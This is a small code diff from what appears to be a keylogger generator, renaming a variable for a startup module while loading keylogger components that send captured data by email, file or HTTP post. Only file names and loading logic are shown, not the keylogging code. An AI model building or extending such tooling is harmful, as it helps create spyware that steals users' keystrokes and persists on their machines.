@@ -93,7 +93,7 @@ class FileNames:
     _3_email = os.path.join(modules, "3.keylogger.email.py") 
     _3_file = os.path.join(modules, "3.keylogger.file.py") 
     _3_post = os.path.join(modules, "3.keylogger.post.py") 
-    _4_cipher = os.path.join(modules, "2.startup.py")
+    _4_startup = os.path.join(modules, "2.startup.py")
     _5_email = os.path.join(modules, "5.start.email.py") 
     _5_file = os.path.join(modules, "5.start.file.py") 
     _5_post = os.path.join(modules, "5.start.post.py") 
@@ -125,8 +125,8 @@ class Generate:
             with open(FileNames._3_file, "r", encoding='utf-8') as _file:
                 self._3_keylogger = _file.read()
 
-        with open(FileNames._4_cipher, "r", encoding='utf-8') as _file:
-            self._4_cipher = _file.read()
+        with open(FileNames._4_startup, "r", encoding='utf-8') as _file:
+            self._4_startup = _file.read()
         
         if self.mode == 1:
             with open(FileNames._5_email, "r", encoding='utf-8') as _file:
